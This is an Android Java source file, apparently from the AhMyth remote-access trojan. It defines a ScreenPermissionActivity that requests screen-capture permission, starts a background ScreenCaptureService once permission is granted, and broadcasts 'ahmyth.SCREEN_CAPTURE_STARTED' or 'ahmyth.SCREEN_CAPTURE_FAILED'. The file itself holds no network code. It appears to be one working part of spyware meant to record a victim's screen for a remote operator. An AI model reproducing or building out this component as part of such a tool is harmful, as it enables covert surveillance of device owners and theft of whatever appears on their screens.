package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.RequiresApi;

public class ScreenPermissionActivity extends Activity {
    
    private static final String TAG = "ScreenPermission";
    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1001;
    
    public static final String EXTRA_RESULT_CODE = "resultCode";
    public static final String EXTRA_RESULT_DATA = "resultData";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            Log.e(TAG, "Screen capture requires Android 5.0 (API 21) or higher");
            finish();
            return;
        }
        
        requestScreenCapture();
    }
    
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void requestScreenCapture() {
        MediaProjectionManager projectionManager = 
            (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        
        Intent captureIntent = projectionManager.createScreenCaptureIntent();
        startActivityForResult(captureIntent, REQUEST_CODE_SCREEN_CAPTURE);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK && data != null) {
                Log.i(TAG, "Screen capture permission granted");
                
                // Start screen capture service
                Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                serviceIntent.setAction("START_CAPTURE");
                serviceIntent.putExtra(EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(EXTRA_RESULT_DATA, data);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
                
                // Notify success via broadcast
                Intent broadcast = new Intent("ahmyth.SCREEN_CAPTURE_STARTED");
                sendBroadcast(broadcast);
                
            } else {
                Log.e(TAG, "Screen capture permission denied");
                
                // Notify failure via broadcast
                Intent broadcast = new Intent("ahmyth.SCREEN_CAPTURE_FAILED");
                sendBroadcast(broadcast);
            }
            
            finish();
        }
    }
}

